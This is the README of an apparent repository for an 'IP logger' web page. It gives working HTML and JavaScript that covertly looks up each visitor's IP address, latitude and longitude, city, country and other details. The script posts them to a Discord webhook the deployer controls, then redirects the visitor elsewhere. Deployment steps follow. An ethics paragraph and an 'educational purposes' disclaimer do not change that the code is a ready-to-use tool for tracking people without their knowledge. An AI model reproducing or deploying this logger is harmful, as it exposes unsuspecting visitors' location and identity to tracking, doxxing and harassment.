

---

# IP Logger Redirect Script

This repository contains a script designed to log IP addresses and other information about users who visit a particular web page, and then redirects them to a Discord server.

## How It Works

1. **HTML Structure**: The HTML page displays a simple "HELLO" message and includes jQuery.
2. **JavaScript Execution**:
   - The script uses `ipapi.co` to get the visitor's IP address and other details.
   - This information is then sent to a Discord webhook.
   - Finally, the user is redirected to a specified Discord server.

## Code Explanation

### HTML Structure

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting...</title>
    <meta charset="utf-8" />
    <h1><center>Star the repo pls</center></h1>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" charset="utf-8"></script>
  </head>
  <body>
    <script type="text/javascript">
      // JavaScript code here
    </script>
  </body>
</html>
```

### JavaScript

```javascript
var WEBURL = " Webhook link here";

$.getJSON("https://ipapi.co/json/", function (data) {
   $.post(WEBURL, {
        content:
          "Ip : " +
          data.ip +
          "Latitude : " +
          data.latitude +
          "Longitude : " +
          data.longitude +
          "\nCity : " +
          data.city +
          "\nCountry : " +
          data.country_name +
          "\nTimeZone : " +
          data.timezone +
          "\nCurrency : " +
          data.currency_name +
          "\nLanguages : " +
          data.languages +
          "\nNumber-Code : " +
          data.country_calling_code +
          "\n@here",

        username: "M7's Logger",
        avatar_url: null,
      });
});

window.location.href = " INVITE LINK OR ANY OTHER LINK";
```

## Ethical Considerations

Please be aware that logging personal information without the user's consent is unethical and potentially illegal. This script collects and sends sensitive information such as IP address, location, and other details to a third party. Use this script responsibly and ensure compliance with privacy laws and regulations.

## Usage

To use this script, host the HTML file on a web server. When users visit the page, their information will be logged and they will be redirected to the specified Discord server.

## Disclaimer

This script is for educational purposes only. The author is not responsible for any misuse of the code. Always respect user privacy and obtain proper consent before collecting any personal information.

---

### Example Usage:

1. Clone the repository:

   ```sh
   git clone https://github.com/yourusername/ip-logger-redirect.git
   ```

2. Host the HTML file on your preferred web server.

3. Update the `WEBURL` variable in the JavaScript code with your Discord webhook URL.

4. Access the hosted HTML page. The script will log user information and redirect them.

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

